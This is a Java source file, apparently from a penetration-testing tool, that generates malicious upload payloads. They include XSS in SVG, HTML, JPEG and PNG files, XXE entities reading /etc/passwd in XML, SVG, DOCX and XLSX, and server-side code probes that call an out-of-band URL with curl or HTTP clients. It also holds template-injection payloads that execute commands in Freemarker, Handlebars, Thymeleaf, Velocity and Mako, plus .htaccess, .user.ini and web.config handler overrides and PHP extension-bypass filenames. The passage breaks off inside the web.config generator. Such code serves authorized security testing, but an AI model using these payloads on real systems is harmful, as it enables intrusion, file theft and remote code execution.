package com.omnistrike.framework;

import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

/**
 * Generates malicious POC files for file upload vulnerability testing.
 * All files are generated as byte arrays — no temp files, no external dependencies.
 *
 * <p>Each payload embeds a unique canary string for detection and optionally
 * a Collaborator/OOB callback URL for blind confirmation.
 *
 * <p>These are POC files for authorized penetration testing only.
 */
public class FilePayloadGenerator {

    private static final SecureRandom RANDOM = new SecureRandom();

    /** Generates a unique canary string for tracking. */
    public static String generateCanary() {
        return "omnistrike_" + Integer.toHexString(RANDOM.nextInt(0xFFFFFF));
    }

    // ==================== PDF ====================

    /**
     * Generates a PDF with embedded JavaScript that fires on open.
     * Works in browser-based PDF viewers (Chrome, Firefox, Adobe Reader).
     * If oobUrl is provided, the JS calls app.launchURL() to trigger OOB callback.
     */
    public static byte[] pdfWithJavaScript(String canary, String oobUrl) {
        String js;
        if (oobUrl != null && !oobUrl.isEmpty()) {
            js = "app.alert('" + canary + "');app.launchURL('" + oobUrl + "',true);";
        } else {
            js = "app.alert('" + canary + "');";
        }

        // Minimal valid PDF with /OpenAction JavaScript
        StringBuilder pdf = new StringBuilder();
        pdf.append("%PDF-1.4\n");
        pdf.append("1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>\nendobj\n");
        pdf.append("2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\n");
        pdf.append("3 0 obj\n<< /Type /Action /S /JavaScript /JS (").append(js).append(") >>\nendobj\n");

        // Cross-reference table
        String body = pdf.toString();
        int xrefOffset = body.length();
        pdf.append("xref\n0 4\n");
        pdf.append("0000000000 65535 f \n");
        // Approximate offsets (sufficient for most parsers)
        pdf.append(String.format("%010d 00000 n \n", body.indexOf("1 0 obj")));
        pdf.append(String.format("%010d 00000 n \n", body.indexOf("2 0 obj")));
        pdf.append(String.format("%010d 00000 n \n", body.indexOf("3 0 obj")));
        pdf.append("trailer\n<< /Size 4 /Root 1 0 R >>\n");
        pdf.append("startxref\n").append(xrefOffset).append("\n%%EOF\n");

        return pdf.toString().getBytes(StandardCharsets.UTF_8);
    }

    // ==================== SVG ====================

    /**
     * Generates an SVG with XSS via onload event handler.
     * Triggers when the SVG is rendered inline in a browser.
     */
    public static byte[] svgWithXss(String canary, String oobUrl) {
        StringBuilder svg = new StringBuilder();
        svg.append("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
        svg.append("<svg xmlns=\"http://www.w3.org/2000/svg\" ");
        if (oobUrl != null && !oobUrl.isEmpty()) {
            svg.append("onload=\"fetch('").append(oobUrl).append("')\"");
        } else {
            svg.append("onload=\"alert('").append(canary).append("')\"");
        }
        svg.append(">\n");
        svg.append("  <text x=\"10\" y=\"20\">").append(canary).append("</text>\n");
        svg.append("</svg>\n");
        return svg.toString().getBytes(StandardCharsets.UTF_8);
    }

    /**
     * Generates an SVG with XXE payload to exfiltrate data or trigger OOB.
     */
    public static byte[] svgWithXxe(String canary, String oobUrl) {
        String entityUrl = (oobUrl != null && !oobUrl.isEmpty()) ? oobUrl : "file:///etc/passwd";
        StringBuilder svg = new StringBuilder();
        svg.append("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
        svg.append("<!DOCTYPE svg [\n");
        svg.append("  <!ENTITY xxe SYSTEM \"").append(entityUrl).append("\">\n");
        svg.append("]>\n");
        svg.append("<svg xmlns=\"http://www.w3.org/2000/svg\">\n");
        svg.append("  <text x=\"10\" y=\"20\">&xxe;</text>\n");
        svg.append("  <!-- ").append(canary).append(" -->\n");
        svg.append("</svg>\n");
        return svg.toString().getBytes(StandardCharsets.UTF_8);
    }

    // ==================== HTML ====================

    /**
     * Generates an HTML file with XSS payload.
     * If uploaded and served, executes JavaScript in victim's browser.
     */
    public static byte[] htmlWithXss(String canary, String oobUrl) {
        StringBuilder html = new StringBuilder();
        html.append("<!DOCTYPE html>\n<html>\n<head><title>").append(canary).append("</title></head>\n");
        html.append("<body>\n");
        html.append("<h1>").append(canary).append("</h1>\n");
        html.append("<script>\n");
        if (oobUrl != null && !oobUrl.isEmpty()) {
            html.append("fetch('").append(oobUrl).append("');\n");
        }
        html.append("document.title='").append(canary).append("';\n");
        html.append("</script>\n");
        html.append("</body>\n</html>\n");
        return html.toString().getBytes(StandardCharsets.UTF_8);
    }

    // ==================== XML with XXE ====================

    /**
     * Generates a plain XML file with XXE payload.
     */
    public static byte[] xmlWithXxe(String canary, String oobUrl) {
        String entityUrl = (oobUrl != null && !oobUrl.isEmpty()) ? oobUrl : "file:///etc/passwd";
        StringBuilder xml = new StringBuilder();
        xml.append("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
        xml.append("<!DOCTYPE root [\n");
        xml.append("  <!ENTITY xxe SYSTEM \"").append(entityUrl).append("\">\n");
        xml.append("]>\n");
        xml.append("<root>\n");
        xml.append("  <data>&xxe;</data>\n");
        xml.append("  <canary>").append(canary).append("</canary>\n");
        xml.append("</root>\n");
        return xml.toString().getBytes(StandardCharsets.UTF_8);
    }

    // ==================== DOCX with XXE ====================

    /**
     * Generates a DOCX file (ZIP format) with XXE in [Content_Types].xml.
     * Many document processing libraries parse this XML, triggering the XXE.
     */
    public static byte[] docxWithXxe(String canary, String oobUrl) {
        String entityUrl = (oobUrl != null && !oobUrl.isEmpty()) ? oobUrl : "file:///etc/passwd";
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ZipOutputStream zos = new ZipOutputStream(baos);

            // [Content_Types].xml with XXE
            String contentTypes = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                    + "<!DOCTYPE Types [\n"
                    + "  <!ENTITY xxe SYSTEM \"" + entityUrl + "\">\n"
                    + "]>\n"
                    + "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">\n"
                    + "  <Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/>\n"
                    + "  <Default Extension=\"xml\" ContentType=\"application/xml\"/>\n"
                    + "  <!-- " + canary + " &xxe; -->\n"
                    + "</Types>\n";
            zos.putNextEntry(new ZipEntry("[Content_Types].xml"));
            zos.write(contentTypes.getBytes(StandardCharsets.UTF_8));
            zos.closeEntry();

            // Minimal _rels/.rels
            String rels = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                    + "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\n"
                    + "  <Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"word/document.xml\"/>\n"
                    + "</Relationships>\n";
            zos.putNextEntry(new ZipEntry("_rels/.rels"));
            zos.write(rels.getBytes(StandardCharsets.UTF_8));
            zos.closeEntry();

            // Minimal word/document.xml
            String doc = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                    + "<w:document xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\">\n"
                    + "  <w:body><w:p><w:r><w:t>" + canary + "</w:t></w:r></w:p></w:body>\n"
                    + "</w:document>\n";
            zos.putNextEntry(new ZipEntry("word/document.xml"));
            zos.write(doc.getBytes(StandardCharsets.UTF_8));
            zos.closeEntry();

            zos.close();
            return baos.toByteArray();
        } catch (Exception e) {
            return new byte[0];
        }
    }

    // ==================== XLSX with XXE ====================

    /**
     * Generates an XLSX file (ZIP format) with XXE in [Content_Types].xml.
     */
    public static byte[] xlsxWithXxe(String canary, String oobUrl) {
        String entityUrl = (oobUrl != null && !oobUrl.isEmpty()) ? oobUrl : "file:///etc/passwd";
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ZipOutputStream zos = new ZipOutputStream(baos);

            // [Content_Types].xml with XXE
            String contentTypes = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                    + "<!DOCTYPE Types [\n"
                    + "  <!ENTITY xxe SYSTEM \"" + entityUrl + "\">\n"
                    + "]>\n"
                    + "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">\n"
                    + "  <Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/>\n"
                    + "  <Default Extension=\"xml\" ContentType=\"application/xml\"/>\n"
                    + "  <!-- " + canary + " &xxe; -->\n"
                    + "</Types>\n";
            zos.putNextEntry(new ZipEntry("[Content_Types].xml"));
            zos.write(contentTypes.getBytes(StandardCharsets.UTF_8));
            zos.closeEntry();

            // Minimal _rels/.rels
            String rels = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                    + "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\n"
                    + "  <Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"xl/workbook.xml\"/>\n"
                    + "</Relationships>\n";
            zos.putNextEntry(new ZipEntry("_rels/.rels"));
            zos.write(rels.getBytes(StandardCharsets.UTF_8));
            zos.closeEntry();

            // Minimal xl/workbook.xml
            String wb = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                    + "<workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\">\n"
                    + "  <sheets><sheet name=\"" + canary + "\" sheetId=\"1\" r:id=\"rId1\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"/></sheets>\n"
                    + "</workbook>\n";
            zos.putNextEntry(new ZipEntry("xl/workbook.xml"));
            zos.write(wb.getBytes(StandardCharsets.UTF_8));
            zos.closeEntry();

            zos.close();
            return baos.toByteArray();
        } catch (Exception e) {
            return new byte[0];
        }
    }

    // ==================== PHP Web Shell (POC) ====================

    /**
     * Generates a PHP POC that echoes a canary and optionally calls back to OOB.
     * NOT a real web shell — no command execution. Just confirms code execution.
     */
    public static byte[] phpPoc(String canary, String oobUrl) {
        StringBuilder php = new StringBuilder();
        php.append("<?php\n");
        php.append("// OmniStrike POC — confirms PHP execution on server\n");
        php.append("echo '").append(canary).append("';\n");
        if (oobUrl != null && !oobUrl.isEmpty()) {
            php.append("@file_get_contents('").append(oobUrl).append("');\n");
        }
        php.append("echo phpversion();\n");
        php.append("?>\n");
        return php.toString().getBytes(StandardCharsets.UTF_8);
    }

    /**
     * PHP POC with common extension bypass names.
     * Returns the payload — the caller should use the suggested filename.
     */
    public static String[] phpBypassFilenames() {
        return new String[]{
                "shell.php",
                "shell.phtml",
                "shell.php5",
                "shell.php7",
                "shell.phar",
                "shell.php.jpg",
                "shell.php%00.jpg",
                "shell.jpg.php",
                "shell.PhP",
                "shell.php.",
                "shell.php;.jpg",
                ".htaccess",  // for Apache AddType injection
        };
    }

    // ==================== JSP Web Shell (POC) ====================

    /**
     * Generates a JSP POC that echoes a canary and optionally calls back to OOB.
     */
    public static byte[] jspPoc(String canary, String oobUrl) {
        StringBuilder jsp = new StringBuilder();
        jsp.append("<%@ page import=\"java.net.*,java.io.*\" %>\n");
        jsp.append("<%\n");
        jsp.append("// OmniStrike POC — confirms JSP execution on server\n");
        jsp.append("out.println(\"").append(canary).append("\");\n");
        if (oobUrl != null && !oobUrl.isEmpty()) {
            jsp.append("try { new URL(\"").append(oobUrl).append("\").openStream().close(); } catch(Exception e) {}\n");
        }
        jsp.append("out.println(System.getProperty(\"java.version\"));\n");
        jsp.append("%>\n");
        return jsp.toString().getBytes(StandardCharsets.UTF_8);
    }

    // ==================== ASPX Web Shell (POC) ====================

    /**
     * Generates an ASPX POC that echoes a canary and optionally calls back to OOB.
     */
    public static byte[] aspxPoc(String canary, String oobUrl) {
        StringBuilder aspx = new StringBuilder();
        aspx.append("<%@ Page Language=\"C#\" %>\n");
        aspx.append("<%\n");
        aspx.append("// OmniStrike POC — confirms ASPX execution on server\n");
        aspx.append("Response.Write(\"").append(canary).append("\");\n");
        if (oobUrl != null && !oobUrl.isEmpty()) {
            aspx.append("try { new System.Net.WebClient().DownloadString(\"").append(oobUrl).append("\"); } catch {}\n");
        }
        aspx.append("Response.Write(Environment.Version.ToString());\n");
        aspx.append("%>\n");
        return aspx.toString().getBytes(StandardCharsets.UTF_8);
    }

    // ==================== Python Web Shell (POC) ====================

    /**
     * Generates a Python POC (for Flask/Django file upload testing).
     */
    public static byte[] pythonPoc(String canary, String oobUrl) {
        StringBuilder py = new StringBuilder();
        py.append("# OmniStrike POC — confirms Python execution\n");
        py.append("import sys\n");
        py.append("print('").append(canary).append("')\n");
        if (oobUrl != null && !oobUrl.isEmpty()) {
            py.append("try:\n");
            py.append("    import urllib.request\n");
            py.append("    urllib.request.urlopen('").append(oobUrl).append("')\n");
            py.append("except: pass\n");
        }
        py.append("print(sys.version)\n");
        return py.toString().getBytes(StandardCharsets.UTF_8);
    }

    // ==================== Polyglot GIF/JS ====================

    /**
     * Generates a polyglot file that is both a valid GIF image and valid JavaScript.
     * If served with text/html or text/javascript content-type, the JS executes.
     */
    public static byte[] polyglotGifJs(String canary, String oobUrl) {
        // GIF89a header followed by JS payload in a comment structure
        // The trick: GIF89a = valid GIF header, and when parsed as JS,
        // the binary header is treated as variable names/expressions
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try {
            // GIF89a header
            baos.write(new byte[]{0x47, 0x49, 0x46, 0x38, 0x39, 0x61}); // GIF89a
            // Minimal GIF image descriptor (1x1 pixel)
            baos.write(new byte[]{0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00});
            // Comment extension with JS payload
            baos.write(new byte[]{0x21, (byte) 0xFE}); // Comment extension
            String jsPayload;
            if (oobUrl != null && !oobUrl.isEmpty()) {
                jsPayload = "*/=1;fetch('" + oobUrl + "');//" + canary;
            } else {
                jsPayload = "*/=1;alert('" + canary + "');//";
            }
            byte[] jsBytes = jsPayload.getBytes(StandardCharsets.US_ASCII);
            baos.write((byte) jsBytes.length);
            baos.write(jsBytes);
            baos.write(0x00); // Block terminator
            // GIF trailer
            baos.write(0x3B);
        } catch (Exception e) {
            return new byte[0];
        }
        return baos.toByteArray();
    }

    // ==================== .htaccess ====================

    /**
     * Generates a .htaccess file that enables PHP execution for .jpg files.
     * If uploaded to an Apache server, subsequent .jpg uploads can contain PHP.
     */
    public static byte[] htaccessPhpBypass(String canary) {
        String htaccess = "# " + canary + "\n"
                + "AddType application/x-httpd-php .jpg\n"
                + "AddType application/x-httpd-php .png\n"
                + "AddType application/x-httpd-php .gif\n";
        return htaccess.getBytes(StandardCharsets.UTF_8);
    }

    // ==================== EICAR Test ====================

    /**
     * Generates the EICAR anti-virus test file.
     * Standard test string that all AV products should detect.
     * Used to test if the upload endpoint has AV scanning.
     */
    public static byte[] eicarTest() {
        return "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
                .getBytes(StandardCharsets.US_ASCII);
    }

    // ==================== JPEG with EXIF XSS ====================

    /**
     * Generates a minimal JPEG file with XSS payload in the EXIF comment field.
     * If the application displays EXIF data without sanitization, the XSS fires.
     */
    public static byte[] jpegWithExifXss(String canary, String oobUrl) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try {
            // JPEG SOI marker
            baos.write(new byte[]{(byte) 0xFF, (byte) 0xD8});

            // APP0 JFIF marker (minimal)
            baos.write(new byte[]{(byte) 0xFF, (byte) 0xE0});
            byte[] jfif = {0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01,
                    0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00};
            baos.write(jfif);

            // COM (comment) marker with XSS payload
            String xssPayload;
            if (oobUrl != null && !oobUrl.isEmpty()) {
                xssPayload = "<img src=x onerror=fetch('" + oobUrl + "')> " + canary;
            } else {
                xssPayload = "<img src=x onerror=alert('" + canary + "')>";
            }
            byte[] commentBytes = xssPayload.getBytes(StandardCharsets.UTF_8);
            baos.write(new byte[]{(byte) 0xFF, (byte) 0xFE}); // COM marker
            int commentLen = commentBytes.length + 2;
            baos.write((byte) (commentLen >> 8));
            baos.write((byte) (commentLen & 0xFF));
            baos.write(commentBytes);

            // Minimal 1x1 white JPEG image data (SOS + EOI)
            baos.write(new byte[]{
                    (byte) 0xFF, (byte) 0xC0, 0x00, 0x0B, 0x08, 0x00, 0x01, 0x00,
                    0x01, 0x01, 0x01, 0x11, 0x00, // SOF0
                    (byte) 0xFF, (byte) 0xC4, 0x00, 0x1F, 0x00, 0x00, 0x01, 0x05,
                    0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x02,
                    0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A,
                    0x0B, // DHT
                    (byte) 0xFF, (byte) 0xDA, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00,
                    0x3F, 0x00, 0x7B, 0x40, // SOS + minimal scan data
                    (byte) 0xFF, (byte) 0xD9 // EOI
            });
        } catch (Exception e) {
            return new byte[0];
        }
        return baos.toByteArray();
    }

    // ==================== PNG with tEXt XSS ====================

    /**
     * Generates a minimal PNG with XSS payload in a tEXt metadata chunk.
     */
    public static byte[] pngWithTextXss(String canary, String oobUrl) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try {
            // PNG signature
            baos.write(new byte[]{(byte) 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A});

            // IHDR chunk (1x1 pixel, 8-bit RGB)
            byte[] ihdrData = {0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x08, 0x02, 0x00, 0x00, 0x00};
            writeChunk(baos, "IHDR", ihdrData);

            // tEXt chunk with XSS payload
            String xssPayload;
            if (oobUrl != null && !oobUrl.isEmpty()) {
                xssPayload = "Comment\0<script>fetch('" + oobUrl + "')</script>" + canary;
            } else {
                xssPayload = "Comment\0<script>alert('" + canary + "')</script>";
            }
            writeChunk(baos, "tEXt", xssPayload.getBytes(StandardCharsets.ISO_8859_1));

            // IDAT chunk (minimal compressed 1x1 pixel)
            byte[] idatData = {0x08, (byte) 0xD7, 0x63, 0x60, 0x60, 0x60, 0x00, 0x00, 0x00, 0x04, 0x00, 0x01};
            writeChunk(baos, "IDAT", idatData);

            // IEND chunk
            writeChunk(baos, "IEND", new byte[0]);
        } catch (Exception e) {
            return new byte[0];
        }
        return baos.toByteArray();
    }

    /** Helper: writes a PNG chunk with type, data, and CRC. */
    private static void writeChunk(ByteArrayOutputStream baos, String type, byte[] data) throws Exception {
        // Length (4 bytes big-endian)
        int len = data.length;
        baos.write(new byte[]{(byte) (len >> 24), (byte) (len >> 16), (byte) (len >> 8), (byte) len});
        // Type (4 bytes ASCII)
        byte[] typeBytes = type.getBytes(StandardCharsets.US_ASCII);
        baos.write(typeBytes);
        // Data
        baos.write(data);
        // CRC32 over type + data
        java.util.zip.CRC32 crc = new java.util.zip.CRC32();
        crc.update(typeBytes);
        crc.update(data);
        long crcVal = crc.getValue();
        baos.write(new byte[]{(byte) (crcVal >> 24), (byte) (crcVal >> 16), (byte) (crcVal >> 8), (byte) crcVal});
    }

    // ==================== SSI (Server-Side Include) ====================

    public static byte[] ssiPoc(String canary, String oobUrl) {
        StringBuilder ssi = new StringBuilder();
        ssi.append("<!-- ").append(canary).append(" -->\n");
        ssi.append("<!--#echo var=\"SERVER_SOFTWARE\" -->\n");
        ssi.append("<!--#echo var=\"DOCUMENT_ROOT\" -->\n");
        if (oobUrl != null && !oobUrl.isEmpty()) {
            ssi.append("<!--#exec cmd=\"curl ").append(oobUrl).append("\" -->\n");
        }
        return ssi.toString().getBytes(StandardCharsets.UTF_8);
    }

    // ==================== Ruby (ERB) ====================

    public static byte[] rubyPoc(String canary, String oobUrl) {
        StringBuilder rb = new StringBuilder();
        rb.append("# OmniStrike POC — confirms Ruby execution\n");
        rb.append("puts '").append(canary).append("'\n");
        if (oobUrl != null && !oobUrl.isEmpty()) {
            rb.append("require 'net/http'\n");
            rb.append("Net::HTTP.get(URI('").append(oobUrl).append("')) rescue nil\n");
        }
        rb.append("puts RUBY_VERSION\n");
        return rb.toString().getBytes(StandardCharsets.UTF_8);
    }

    // ==================== Perl ====================

    public static byte[] perlPoc(String canary, String oobUrl) {
        StringBuilder pl = new StringBuilder();
        pl.append("#!/usr/bin/perl\n");
        pl.append("# OmniStrike POC — confirms Perl execution\n");
        pl.append("print \"").append(canary).append("\\n\";\n");
        if (oobUrl != null && !oobUrl.isEmpty()) {
            pl.append("use LWP::Simple; get('").append(oobUrl).append("');\n");
        }
        pl.append("print $];\n"); // Perl version
        return pl.toString().getBytes(StandardCharsets.UTF_8);
    }

    // ==================== Node.js ====================

    public static byte[] nodejsPoc(String canary, String oobUrl) {
        StringBuilder js = new StringBuilder();
        js.append("// OmniStrike POC — confirms Node.js execution\n");
        js.append("console.log('").append(canary).append("');\n");
        if (oobUrl != null && !oobUrl.isEmpty()) {
            js.append("require('http').get('").append(oobUrl).append("');\n");
        }
        js.append("console.log(process.version);\n");
        return js.toString().getBytes(StandardCharsets.UTF_8);
    }

    // ==================== Bash / Shell ====================

    public static byte[] bashPoc(String canary, String oobUrl) {
        StringBuilder sh = new StringBuilder();
        sh.append("#!/bin/bash\n");
        sh.append("# OmniStrike POC — confirms shell execution\n");
        sh.append("echo '").append(canary).append("'\n");
        if (oobUrl != null && !oobUrl.isEmpty()) {
            sh.append("curl -s '").append(oobUrl).append("' >/dev/null 2>&1 &\n");
        }
        sh.append("uname -a\n");
        sh.append("id\n");
        return sh.toString().getBytes(StandardCharsets.UTF_8);
    }

    // ==================== PowerShell ====================

    public static byte[] powershellPoc(String canary, String oobUrl) {
        StringBuilder ps = new StringBuilder();
        ps.append("# OmniStrike POC — confirms PowerShell execution\n");
        ps.append("Write-Output '").append(canary).append("'\n");
        if (oobUrl != null && !oobUrl.isEmpty()) {
            ps.append("try { Invoke-WebRequest '").append(oobUrl).append("' -UseBasicParsing } catch {}\n");
        }
        ps.append("$PSVersionTable.PSVersion\n");
        return ps.toString().getBytes(StandardCharsets.UTF_8);
    }

    // ==================== ColdFusion (CFML) ====================

    public static byte[] cfmlPoc(String canary, String oobUrl) {
        StringBuilder cfm = new StringBuilder();
        cfm.append("<cfoutput>").append(canary).append("</cfoutput>\n");
        if (oobUrl != null && !oobUrl.isEmpty()) {
            cfm.append("<cfhttp url=\"").append(oobUrl).append("\" method=\"GET\" />\n");
        }
        cfm.append("<cfoutput>#server.coldfusion.productversion#</cfoutput>\n");
        return cfm.toString().getBytes(StandardCharsets.UTF_8);
    }

    // ==================== Go Template ====================

    public static byte[] goTemplatePoc(String canary, String oobUrl) {
        StringBuilder go = new StringBuilder();
        go.append("{{/* OmniStrike POC */}}\n");
        go.append("{{\"").append(canary).append("\"}}\n");
        go.append("{{.}}\n"); // Dump all template data
        return go.toString().getBytes(StandardCharsets.UTF_8);
    }

    // ==================== Jinja2 Template ====================

    public static byte[] jinja2Poc(String canary, String oobUrl) {
        StringBuilder j2 = new StringBuilder();
        j2.append("{# OmniStrike POC #}\n");
        j2.append("{{ '").append(canary).append("' }}\n");
        j2.append("{{ config.items() }}\n");
        j2.append("{{ ''.__class__.__mro__[1].__subclasses__() }}\n");
        return j2.toString().getBytes(StandardCharsets.UTF_8);
    }

    // ==================== Freemarker Template ====================

    public static byte[] freemarkerPoc(String canary, String oobUrl) {
        StringBuilder fm = new StringBuilder();
        fm.append("<#-- OmniStrike POC -->\n");
        fm.append("${\"").append(canary).append("\"}\n");
        fm.append("<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}\n");
        if (oobUrl != null && !oobUrl.isEmpty()) {
            fm.append("<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"curl ").append(oobUrl).append("\")}\n");
        }
        return fm.toString().getBytes(StandardCharsets.UTF_8);
    }

    // ==================== Handlebars Template ====================

    public static byte[] handlebarsPoc(String canary, String oobUrl) {
        StringBuilder hbs = new StringBuilder();
        hbs.append("{{! OmniStrike POC }}\n");
        hbs.append("{{").append(canary).append("}}\n");
        hbs.append("{{#with \"s\" as |string|}}\n");
        hbs.append("  {{#with \"e\"}}\n");
        hbs.append("    {{#with split as |conslist|}}\n");
        hbs.append("      {{this.pop}}\n");
        hbs.append("      {{this.push (lookup string.sub \"constructor\")}}\n");
        hbs.append("      {{this.pop}}\n");
        hbs.append("      {{#with string.split as |codelist|}}\n");
        hbs.append("        {{this.pop}}\n");
        hbs.append("        {{this.push \"return require('child_process').execSync('id');\"}}\n");
        hbs.append("        {{this.pop}}\n");
        hbs.append("        {{#each conslist}}\n");
        hbs.append("          {{#with (string.sub.apply 0 codelist)}}\n");
        hbs.append("            {{this}}\n");
        hbs.append("          {{/with}}\n");
        hbs.append("        {{/each}}\n");
        hbs.append("      {{/with}}\n");
        hbs.append("    {{/with}}\n");
        hbs.append("  {{/with}}\n");
        hbs.append("{{/with}}\n");
        return hbs.toString().getBytes(StandardCharsets.UTF_8);
    }

    // ==================== EJS Template ====================

    public static byte[] ejsPoc(String canary, String oobUrl) {
        StringBuilder ejs = new StringBuilder();
        ejs.append("<%# OmniStrike POC %>\n");
        ejs.append("<%= '").append(canary).append("' %>\n");
        ejs.append("<%= process.version %>\n");
        if (oobUrl != null && !oobUrl.isEmpty()) {
            ejs.append("<% require('http').get('").append(oobUrl).append("') %>\n");
        }
        return ejs.toString().getBytes(StandardCharsets.UTF_8);
    }

    // ==================== Smarty (PHP Template) ====================

    public static byte[] smartyPoc(String canary, String oobUrl) {
        StringBuilder smarty = new StringBuilder();
        smarty.append("{* OmniStrike POC *}\n");
        smarty.append("{$smarty.version}\n");
        smarty.append("{system('echo ").append(canary).append("')}\n"); // Smarty 3+
        smarty.append("{php}echo '").append(canary).append("';{/php}\n"); // Smarty 2.x fallback
        if (oobUrl != null && !oobUrl.isEmpty()) {
            smarty.append("{system('curl ").append(oobUrl).append("')}\n");
            smarty.append("{php}file_get_contents('").append(oobUrl).append("');{/php}\n"); // Smarty 2.x fallback
        }
        return smarty.toString().getBytes(StandardCharsets.UTF_8);
    }

    // ==================== Pug/Jade Template ====================

    public static byte[] pugPoc(String canary, String oobUrl) {
        StringBuilder pug = new StringBuilder();
        pug.append("//- OmniStrike POC\n");
        pug.append("- var x = '").append(canary).append("'\n");
        pug.append("p= x\n");
        if (oobUrl != null && !oobUrl.isEmpty()) {
            pug.append("- global.process.mainModule.require('http').get('").append(oobUrl).append("')\n");
        }
        return pug.toString().getBytes(StandardCharsets.UTF_8);
    }

    // ==================== Mako Template (Python) ====================

    public static byte[] makoPoc(String canary, String oobUrl) {
        StringBuilder mako = new StringBuilder();
        mako.append("## OmniStrike POC\n");
        mako.append("${\"").append(canary).append("\"}\n");
        mako.append("<%\nimport os\nos.popen('id').read()\n%>\n");
        if (oobUrl != null && !oobUrl.isEmpty()) {
            mako.append("<%\nimport urllib.request\nurllib.request.urlopen('").append(oobUrl).append("')\n%>\n");
        }
        return mako.toString().getBytes(StandardCharsets.UTF_8);
    }

    // ==================== Thymeleaf (Java Template) ====================

    public static byte[] thymeleafPoc(String canary, String oobUrl) {
        StringBuilder th = new StringBuilder();
        th.append("<!-- OmniStrike POC -->\n");
        th.append("<div th:text=\"'").append(canary).append("'\">");
        th.append("</div>\n");
        th.append("<div th:text=\"${T(java.lang.Runtime).getRuntime().exec('id')}\">");
        th.append("</div>\n");
        if (oobUrl != null && !oobUrl.isEmpty()) {
            th.append("<div th:text=\"${T(java.lang.Runtime).getRuntime().exec('nslookup ").append(oobUrl.replace("http://", "").replace("https://", "")).append("')}\">");
            th.append("</div>\n");
        }
        return th.toString().getBytes(StandardCharsets.UTF_8);
    }

    // ==================== Velocity (Java Template) ====================

    public static byte[] velocityPoc(String canary, String oobUrl) {
        StringBuilder vm = new StringBuilder();
        vm.append("## OmniStrike POC\n");
        vm.append("#set($c='").append(canary).append("')\n");
        vm.append("$c\n");
        vm.append("#set($rt=$c.class.forName('java.lang.Runtime'))\n");
        vm.append("#set($exec=$rt.getRuntime().exec('id'))\n");
        vm.append("$exec\n");
        return vm.toString().getBytes(StandardCharsets.UTF_8);
    }

    // ==================== XSLT Injection ====================

    public static byte[] xsltPoc(String canary, String oobUrl) {
        String entityUrl = (oobUrl != null && !oobUrl.isEmpty()) ? oobUrl : "file:///etc/passwd";
        StringBuilder xslt = new StringBuilder();
        xslt.append("<?xml version=\"1.0\"?>\n");
        xslt.append("<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\n");
        xslt.append("  <xsl:template match=\"/\">\n");
        xslt.append("    <xsl:value-of select=\"document('").append(entityUrl).append("')\"/>\n");
        xslt.append("    <!-- ").append(canary).append(" -->\n");
        xslt.append("  </xsl:template>\n");
        xslt.append("</xsl:stylesheet>\n");
        return xslt.toString().getBytes(StandardCharsets.UTF_8);
    }

    // ==================== .user.ini (PHP config override) ====================

    public static byte[] userIniPoc(String canary) {
        StringBuilder ini = new StringBuilder();
        ini.append("; ").append(canary).append("\n");
        ini.append("auto_prepend_file=shell.jpg\n");
        return ini.toString().getBytes(StandardCharsets.UTF_8);
    }

    // ==================== web.config (IIS) ====================

    public static byte[] webConfigPoc(String canary, String oobUrl) {
        StringBuilder wc = new StringBuilder();
        wc.append("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
        wc.append("<!-- ").append(canary).append(" -->\n");
        wc.append("<configuration>\n");
        wc.append("  <system.webServer>\n");
        wc.append("    <handlers>\n");
        wc.append("      <add name=\"omnistrike\" path=\"*.jpg\" verb=\"*\" ");
        wc.append("modules=\"IsapiModule\" scriptProcessor=\"%windir%\\system32\\inetsrv\\asp.dll\" ");
